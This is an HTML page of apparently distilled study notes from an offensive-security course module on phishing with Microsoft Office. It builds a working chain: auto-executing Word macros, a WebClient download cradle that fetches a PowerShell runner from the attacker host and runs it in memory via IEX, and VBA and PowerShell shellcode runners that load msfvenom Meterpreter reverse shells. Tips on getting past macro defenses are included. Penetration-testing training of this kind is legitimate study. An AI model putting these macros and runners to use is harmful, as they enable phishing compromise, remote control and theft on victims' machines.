@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="es" data-nz-theme="light" data-nz-marca="monocromo">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>04 · Phishing with Microsoft Office — distill</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/tokens.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/marcas/monocromo.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p1-layout.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p2-navigation.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p3-typography.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p4-actions.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p6-feedback.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p8-data.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p17-patrones.css">
+<script src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"></script>
+<script>
+const mq = matchMedia('(prefers-color-scheme: dark)');
+const saved = localStorage.getItem('nz-theme');
+if (saved === 'dark' || saved === 'light') document.documentElement.dataset.nzTheme = saved;
+else if (mq.matches) document.documentElement.dataset.nzTheme = 'dark';
+mq.addEventListener('change', e => {
+  if (!localStorage.getItem('nz-theme')) document.documentElement.dataset.nzTheme = e.matches ? 'dark' : 'light';
+});
+function nzToggleTheme() {
+  const cur = document.documentElement.dataset.nzTheme === 'dark' ? 'light' : 'dark';
+  document.documentElement.dataset.nzTheme = cur;
+  localStorage.setItem('nz-theme', cur);
+  if (window.nzAfterTheme) nzAfterTheme();
+}
+mermaid.initialize({ startOnLoad: false });
+mermaid.initialize({ startOnLoad: false, theme: document.documentElement.dataset.nzTheme === 'dark' ? 'dark' : 'neutral' });
+window.nzAfterTheme = async () => {
+  document.querySelectorAll('.mermaid').forEach(el => {
+    const code = el.getAttribute('data-src') || el.textContent;
+    el.setAttribute('data-src', code);
+    el.removeAttribute('data-processed');
+    el.textContent = code;
+  });
+  mermaid.initialize({ startOnLoad: false, theme: document.documentElement.dataset.nzTheme === 'dark' ? 'dark' : 'neutral' });
+  await mermaid.run({ querySelector: '.mermaid' });
+};
+document.addEventListener('DOMContentLoaded', () => {
+  if (document.querySelector('.mermaid')) mermaid.run({ querySelector: '.mermaid' });
+});
+</script>
+<style>
+.nz-prose pre.mermaid { background: none; text-align: center; }
+</style>
+</head>
+<body class="nz">
+<div class="nz-navbar nz-navbar--compact nz-navbar--bordered">
+<span class="nz-navbar__brand"><i></i>Distill</span>
+<span class="nz-navbar__links">
+<a class="nz-navbar__link" href="../../index.html">Índice</a>
+<a class="nz-navbar__link" href="../osep.html">OSEP (PEN-300)</a>
+<button class="nz-btn nz-btn--ghost nz-btn--sm" onclick="nzToggleTheme()" aria-label="Cambiar tema">◐</button>
+</span>
+</div>
+<main class="nz-container" style="padding-block: var(--nz-space-4)">
+<article class="nz-article">
+<header style="margin-bottom:var(--nz-space-4)">
+<p class="nz-eyebrow">Distill · OSEP (PEN-300)</p>
+<h1 class="nz-h2">04 · Phishing with Microsoft Office</h1>
+<p class="nz-lbl nz-lbl--neutral">Fuente: material del curso correspondiente (sin video público)</p>
+</header>
+<div class="nz-prose">
+<blockquote>
+<p>Distilled from OffSec PEN-300 (OSEP) course material (module: Phishing with Microsoft Office) — internal training reference, not for redistribution.</p>
+</blockquote>
+<h2>1. Module brief</h2>
+<p>Hands-on companion to module 03's middle sections: build a phishing-delivered Office macro end to end — from a first auto-executing macro to a staged Meterpreter session running entirely in memory, first from VBA, then ported to PowerShell. Same building blocks as module 03 (VirtualAlloc / RtlMoveMemory / CreateThread, WebClient cradles), renumbered Listings 1–41.</p>
+<p>Lab roles: Kali attacker <code>192.168.119.120</code>, Windows 11 victim <code>192.168.120.11</code>. Word 2021 is installed on the victim; course artifacts live in <code>C:\Tools</code> and <code>C:\installs</code> on the victim.</p>
+<p>Learning objectives:</p>
+<ul>
+<li>Calling Win32 APIs from VBA</li>
+<li>Implementing a VBA shellcode runner</li>
+<li>Calling Win32 APIs from PowerShell</li>
+<li>Porting the shellcode runner to PowerShell</li>
+</ul>
+<h2>2. Office on the victim — the defenses we must survive</h2>
+<p>Install Word from <code>C:\installs\Word2021Retail.img</code> (double-click mounts it as a virtual CD → <code>Setup.exe</code>); accept the license, decline optional data. The installed version shows under <strong>Account</strong> options (exercise).</p>
+<p>The macro-security gauntlet, in order:</p>
+<ul>
+<li><strong>Trust Center</strong> (File &gt; Options &gt; Trust Center): the default is <em>"Disable all macros with notification"</em> — the victim must click <strong>Enable Content</strong> on the warning banner for anything to run.</li>
+<li><strong>Protected View</strong> (Office 2010+): documents from the Internet open in a sandbox — macros disabled, external images blocked, an extra warning banner shown.</li>
+<li><strong>Mark of the Web (MOTW)</strong>: Office 2021+ / 365 refuse to run macros in <em>any</em> file carrying the Internet-zone flag, even after the victim clicks <strong>Enable Editing</strong>. This has measurably reduced macro effectiveness.</li>
+</ul>
+<p>File formats matter: macros require a macro-enabled format (<code>.doc</code>, <code>.docm</code>); <code>.docx</code> silently drops them. During development we save to the legacy <code>.doc</code> (Word 97-2003) format.</p>
+<blockquote>
+<p>Lab: download <code>C:\Tools\safe.doc</code> to Kali, rename and host it with a Python web server, re-download on Windows 11, and confirm the MOTW attribute is set (file Properties shows the Internet zone).</p>
+</blockquote>
+<h2>3. VBA basics</h2>
+<p>Create a macro via View &gt; Macros, pick <strong>the current document</strong> from the drop-down (otherwise the macro lands in the global template), name it, Create. <code>Sub MyMacro ... End Sub</code> defines a method (VBA methods return nothing; <code>Function ... End Function</code> returns a value). Declare variables with <code>Dim name As type</code> (Listing 1), branch with If/Else (Listing 2), loop with For/Next (Listing 3):</p>
+<pre><code class="language-vba">For counter = 1 To 3
+    MsgBox (&quot;Alert&quot;)
+Next counter
+</code></pre>
+<blockquote>
+<p>Exercise: Listing-below macro hides a bug — fix it, run it, record the result. Then write a macro printing <code>username || computername</code> with the <code>Environ</code> function.</p>
+</blockquote>
+<h2>4. Auto-execution and spawning processes</h2>
+<p>Two entry points fire when the document opens; use both for redundancy (Listing 4):</p>
+<pre><code class="language-vba">Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+</code></pre>
+<p>(The Excel counterpart of <code>Document_Open()</code> is <code>Workbook_Open()</code>.)</p>
+<p>From there, spawn processes: <code>Shell "cmd.exe"</code> opens a visible cmd (Listing 5); the Windows Script Host route hides it (Listing 6):</p>
+<pre><code class="language-vba">Sub MyMacro()
+    Dim str As String
+    str = &quot;cmd.exe&quot;
+    CreateObject(&quot;Wscript.Shell&quot;).Run str, 0
+End Sub
+</code></pre>
+<p>Verify with Process Explorer: <code>cmd.exe</code> appears as a child of <code>WINWORD.EXE</code>.</p>
+<h2>5. PowerShell download cradle inside the macro</h2>
+<p>Four-line PowerShell download of the staged Meterpreter executable (Listing 7), compressed to a one-liner (Listing 8):</p>
+<pre><code class="language-powershell">(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')
+</code></pre>
+<p>Embed it in VBA with <code>Shell str, vbHide</code> (Listing 9). The download lands in the Word process's current folder — resolve the full path for execution with <code>ActiveDocument.Path</code> (Listing 10). Word has no Sleep, so implement one with a busy loop (Listing 11):</p>
+<pre><code class="language-vba">Sub Wait(n As Long)
+    Dim t As Date
+    t = Now
+    Do
+        DoEvents
+    Loop Until Now &gt;= DateAdd(&quot;s&quot;, n, t)
+End Sub
+</code></pre>
+<p>The completed macro (Listing 12) then chains: cradle → <code>Wait</code> → <code>Shell exePath</code> — with <code>msfstaged.exe</code> staged on the Kali web server and a <code>multi/handler</code> waiting.</p>
+<blockquote>
+<p>Exercises: which cmdlet runs when <code>curl</code> is typed in PowerShell on Windows 11? Then build the same cradle with <code>Invoke-WebRequest</code> — what parameter stores the file?</p>
+</blockquote>
+<h2>6. Calling Win32 APIs from VBA</h2>
+<p>VBA imports unmanaged functions with the <code>Declare</code> statement (<code>Declare PtrSafe</code> for 64-bit VBA). The C prototype for <code>GetUserNameA</code> (advapi32.dll) is:</p>
+<pre><code class="language-c">BOOL GetUserNameA(
+  [out]     LPSTR   lpBuffer,
+  [in, out] LPDWORD pcbBuffer
+);
+</code></pre>
+<p>Translate the C types (<code>BOOL</code>→<code>Long</code>, <code>LPSTR</code>→<code>String</code>, <code>LPDWORD</code>→<code>Long</code>), mark in-params <code>ByVal</code> and out-params <code>ByRef</code> (Listing 13):</p>
+<pre><code class="language-vba">Private Declare PtrSafe Function GetUserName Lib &quot;advapi32.dll&quot; Alias &quot;GetUserNameA&quot; (ByVal lpBuffer As String, ByRef nSize As Long) As Long
+</code></pre>
+<p>Calling it needs a fixed-size string buffer (a C string is null-terminated — the buffer is oversized and the tail padded with spaces). Recover the real length by locating the null char with <code>InStr</code>, then substring with <code>Left$</code> (Listing 16):</p>
+<pre><code class="language-vba">Function MyMacro()
+  Dim MyBuff As String * 256
+  Dim MySize As Long
+  Dim strlen As Long
+  MySize = 256
+  MySize = GetUserName(MyBuff, MySize)
+  strlen = InStr(1, MyBuff, vbNullChar) - 1
+  MsgBox Left$(MyBuff, strlen)
+End Function
+</code></pre>
+<p>This proof of concept is the gate to everything below: arbitrary Win32 APIs callable directly from VBA.</p>
+<blockquote>
+<p>Exercises: call <code>GetPhysicallyInstalledSystemMemory</code> and report installed RAM; port the API to <code>GetVersionEx</code>.</p>
+</blockquote>
+<h2>7. VBA shellcode runner</h2>
+<p>Four imports, then the payload.</p>
+<p><strong>VirtualAlloc</strong> (kernel32) reserves executable memory (Listing 17). Arguments: <code>lpAddress = 0</code> (let the OS choose), <code>dwSize = UBound(buf) + 1</code> (dynamic — survives payload swaps; VBA arrays are zero-indexed), <code>flAllocationType = &amp;H3000</code> (MEM_COMMIT | MEM_RESERVE), <code>flProtect = &amp;H40</code> (PAGE_EXECUTE_READWRITE).</p>
+<p><strong>The shellcode</strong> comes from msfvenom in <code>vbapplication</code> format (Listing 19) — note <code>EXITFUNC=thread</code> so Word survives the shell:</p>
+<pre><code>kali@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplication
+...
+Payload size: 793 bytes
+Final size of vbapplication file: 2655 bytes
+buf = Array(&lt;793 decimal byte values — paste verbatim into the macro&gt;)
+</code></pre>
+<p><strong>RtlMoveMemory</strong> (Listing 21 prototype, Listing 22 declare) copies the array into the allocated buffer byte-by-byte:</p>
+<pre><code class="language-vba">Private Declare PtrSafe Function RtlMoveMemory Lib &quot;KERNEL32&quot; (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
+</code></pre>
+<p>Destination is already a pointer (pass as-is); Source is the array element (by reference); Length by value. The copy loop itself is a plain <code>For counter = LBound(buf) To UBound(buf)</code> walking one byte per iteration (Listing 23).</p>
+<p><strong>CreateThread</strong> (Listing 24 prototype / declare, invoked in Listing 26) points a new execution thread at <code>addr</code>, the address VirtualAlloc returned. With <code>buf</code> pasted in, the assembled macro (Listing 27) yields a Meterpreter session — Word stays alive the whole time.</p>
+<blockquote>
+<p>Exercise: rebuild the runner with <code>windows/x64/meterpreter/reverse_tcp</code> on port 50000 — catch it with the matching multi/handler.</p>
+</blockquote>
+<h2>8. Porting the runner to PowerShell</h2>
+<p>Why port at all? Two motivations: embedding shellcode straight into the document turns the file into a static-AV target, and a VBA runner's thread dies with its host — we want the payload to outlive Word.</p>
+<p>Warm up with a managed API first: <code>MessageBox</code> from user32.dll (Listing 28 C prototype). Translate via <strong>P/Invoke</strong> (<code>www.pinvoke.net</code> documents the common signatures) into a C# <code>DllImport</code> (Listing 29), wrap it with the required namespaces, and compile at runtime with <code>Add-Type</code> in PowerShell:</p>
+<pre><code class="language-powershell">using System;
+using System.Runtime.InteropServices;
+
+public class User32 {
+  [DllImport(&quot;user32.dll&quot;, SetLastError = true, CharSet = CharSet.Auto)]
+  public static extern int MessageBox(int hWnd, String text, String caption, uint type);
+}
+</code></pre>
+<p>A <code>[User32]::MessageBox(0,"txt","title",0)</code> call pops the box — unmanaged code from PowerShell.</p>
+<p>For the shellcode runner, P/Invoke the kernel32 trio into a C# class in the same way (Listing 34): <code>VirtualAlloc</code> (<code>LPVOID</code>→<code>IntPtr</code>, sizes as <code>UInt32</code>/<code>int</code>) and <code>CreateThread</code>.</p>
+<p>Regenerate the payload in <code>ps1</code> format (Listing 35, <code>EXITFUNC=thread</code>, 800 bytes; the <code>[Byte[]] $buf = &lt;msfvenom output&gt;</code> array is pasted as-is). The runner itself (Listing 36) is the same three-step chain as §7:</p>
+<pre><code class="language-powershell">$size = $buf.Length
+
+[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);
+
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
+
+$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
+</code></pre>
+<p>Catch it with <code>multi/handler</code> (Listing 37) and the session opens.</p>
+<p><strong>Delivery from Word.</strong> Do not embed the runner in the macro — stage it. The macro carries only a download cradle that pulls <code>run.ps1</code> into memory and executes it (Listing 38):</p>
+<pre><code class="language-vba">Sub MyMacro()
+    Dim str As String
+    str = &quot;powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.ps1') | IEX&quot;
+    Shell str, vbHide
+End Sub
+</code></pre>
+<p>The two auto-execution wrappers call it, exactly as in §4:</p>
+<pre><code class="language-vba">Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+</code></pre>
+<p>Copy the runner into <code>run.ps1</code> in the Kali Apache web root (<code>sudo cp runner.ps1 /var/www/html/run.ps1</code>), <code>sudo systemctl start apache2</code>, then open the macro document.</p>
+<h2>9. Troubleshooting: the dying shell</h2>
+<p>First attempt catches nothing. Triage: the macro fired — Apache's access log shows the GET (Listing 39):</p>
+<pre><code>kali@kali:~$ sudo tail /var/log/apache2/access.log
+...
+192.168.120.11 - - [08/Jun/2024:05:21:22 -0400] &quot;GET /run.ps1 HTTP/1.1&quot; 200 4202 &quot;-&quot; &quot;-&quot;
+</code></pre>
+<p>Process Explorer (if we're quick) shows a PowerShell process spawning and immediately terminating. Diagnosis: the VBA runner's parent (Word) never exits, but here the parent <strong>is</strong> PowerShell, which ends the moment <code>run.ps1</code> finishes — killing the Meterpreter thread with it.</p>
+<p>Fix: import <code>WaitForSingleObject</code> alongside the other kernel32 functions (a <code>DWORD</code> handle plus a <code>DWORD</code> timeout) and, after <code>CreateThread</code>, block the parent on the shellcode thread's handle with an infinite wait (Listing 40):</p>
+<pre><code class="language-powershell">$WaitForSingleObject = [Kernel32]::WaitForSingleObject($thandle, 0xFFFFFFFF)
+[int32]$WaitForSingleObject
+</code></pre>
+<p>Note the <code>[int32]</code> cast — PowerShell 5 runs 64-bit but renders unmanaged ints as signed, so <code>0xFFFFFFFF</code> must be cast or the call throws a type error. With the parent parked, the session is stable (Listing 41).</p>
+<blockquote>
+<p>Exercises: report <code>GetDriveType</code>'s return when the victim browses a network share; save the runner as a <code>.txt</code> and load it with <code>Get-Content</code> — why does that evade Office's macro defenses?</p>
+</blockquote>
+<h2>10. Notes and gotchas</h2>
+<ul>
+<li><code>EXITFUNC=thread</code> on every msfvenom payload in this module — <code>process</code> would kill Word/PowerShell when the stage exits.</li>
+<li>Size the allocation dynamically (<code>UBound</code>/<code>$buf.Length</code>), never hardcode payload size.</li>
+<li>VBA hex is <code>&amp;H3000</code>/<code>&amp;H40</code>; the values are MEM_COMMIT|MEM_RESERVE and PAGE_EXECUTE_READWRITE.</li>
+<li><code>Shell str, vbHide</code> hides the console but the process still runs; <code>CreateObject("Wscript.Shell").Run str, 0</code> is the WSH alternative.</li>
+<li><code>DownloadString | IEX</code> keeps the second stage entirely in memory — only the macro-cradle text ever hits disk.</li>
+<li>PowerShell's <code>WaitForSingleObject</code> needs an explicit <code>[int32]</code>-compatible timeout or the invocation fails.</li>
+<li>MOTW + Protected View are the real-world blockers: a <code>.doc</code> re-hosted from the Internet carries the zone flag even after renaming.</li>
+</ul>
+</div>
+<footer class="nz-callout" style="margin-top:var(--nz-space-5)">
+<p class="nz-lbl">Atribución</p>
+<p>Artículo destilado en español a partir de material del curso correspondiente. El análisis y la redacción son propios; las ideas y los datos presentados corresponden a los autores originales.</p>
+</footer>
+</article>
+</main>
+</body>
+</html>
